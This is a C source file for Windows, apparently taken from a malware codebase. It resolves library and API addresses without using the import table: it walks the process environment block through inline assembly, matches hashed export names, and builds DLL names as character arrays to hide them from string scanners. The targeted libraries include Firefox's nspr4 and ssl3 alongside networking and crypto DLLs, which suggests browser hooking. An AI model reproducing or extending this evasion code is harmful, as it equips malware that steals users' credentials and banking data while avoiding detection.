#include <windows.h>

#include "Getapi.h"
#include "Crypt.h"
#include "Utils.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "ntdll.h"

DWORD pGetLastError()
{
	DWORD dwRet = 0;

	__asm
	{
		MOV EAX,DWORD PTR FS:[18h]
		MOV EAX,DWORD PTR DS:[EAX+34h]
		MOV [dwRet], EAX
	}

	return dwRet;
}

HMODULE GetKernel32(void)
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == 0x4B1FFE8E )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

HMODULE GetDllBase( DWORD dwDllHash )
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		m_memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        m_wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( m_wcslwr( wcDllName ) ) == dwDllHash )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash )
{
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)hModule + ( (PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
	PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
	
	int nOrdinal;

	if ( HIWORD( (DWORD)dwProcNameHash) == 0 ) 
	{
		nOrdinal = (LOWORD((DWORD)dwProcNameHash)) - ped->Base;
	}
	else
	{
		DWORD *pdwNamePtr  = (DWORD*)RVATOVA( hModule, ped->AddressOfNames );
		WORD *pwOrdinalPtr =  (WORD*)RVATOVA( hModule, ped->AddressOfNameOrdinals );

		unsigned int i = 0;

		for ( i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
		{
			if ( CalcHash( (char*)RVATOVA( hModule, *pdwNamePtr ) ) == dwProcNameHash )
			{
				nOrdinal = *pwOrdinalPtr;
				break;
			}
		}

		if ( i == ped->NumberOfNames ) 
		{
			return 0;
		}
	}

	PDWORD pAddrTable = (PDWORD)RVATOVA( hModule, ped->AddressOfFunctions );
	DWORD dwRVA		  = pAddrTable[ nOrdinal ];
	DWORD ret		  = (DWORD)RVATOVA( hModule, dwRVA );

	return (LPVOID)ret;
}

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash )
{
	HMODULE hModule = NULL;

	char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
	char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
	char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
	char winsta_dll[]	= {'w','i','n','s','t','a','.','d','l','l',0};
	char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
	char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
	char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
	char nspr4_dll[]	= {'n','s','p','r','4','.','d','l','l',0};
	char ssl3_dll[]		= {'s','s','l','3','.','d','l','l',0};
	char winmm_dll[]	= {'w','i','n','m','m','.','d','l','l',0};
	char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
	char inetcpl_dll[]  = {'i','n','e','t','c','p','l','.','c','p','l',0};
	char crypt32_dll[]	= {'c','r','y','p','t','3','2','.','d','l','l',0};
	char imagehlp_dll[] = {'i','m','a','g','e','h','l','p','.','d','l','l',0};
	char ole32_dll[]	= {'o','l','e','3','2','.','d','l','l',0};
	char shlwapi_dll[]	= {'s','h','l','w','a','p','i','.','d','l','l',0};

	char *DllName = NULL;

	if ( Dll == NULL )
	{
		switch ( dwModule ) 
		{
			case 1: 
				hModule = GetKernel32();
			break;

			case 2:
				DllName = advapi32_dll;
			break;

			case 3:
				DllName = user32_dll;
			break;

			case 4:
				DllName = ws2_32_dll;
			break;

			case 5:
				DllName = ntdll_dll;
			break;

			case 6:
				DllName = winsta_dll; 
			break;

			case 7:
				DllName = shell32_dll; 
			break;

			case 8:
				DllName = wininet_dll;
			break;

			case 9:
				DllName = urlmon_dll;
			break;

			case 10:
				DllName = nspr4_dll;
			break;

			case 11:
				DllName = ssl3_dll;
			break;

			case 12:
				DllName = winmm_dll;
			break;
			
			case 13:
				DllName = cabinet_dll;
			break;
			case 14:
				DllName = inetcpl_dll;
			break;
			case 15:
				DllName = crypt32_dll;
			break;
			case 16:
				DllName = imagehlp_dll;
				break;
			case 17:
				DllName = ole32_dll;
				break;
			case 18:
				DllName = shlwapi_dll;
				break;
			default:
				return 0;
		}
	}
	else
	{
		hModule = (HMODULE)pLoadLibraryA( Dll ); 
	}

	if ( hModule == NULL && m_lstrlen( DllName ) )
	{
		hModule = (HMODULE)pLoadLibraryA( DllName );
	}

	LPVOID ret = GetApiAddr( hModule, dwProcNameHash );

	if ( ret == NULL )
	{
		return (LPVOID)0x00000000;
	}

	return ret;
} 
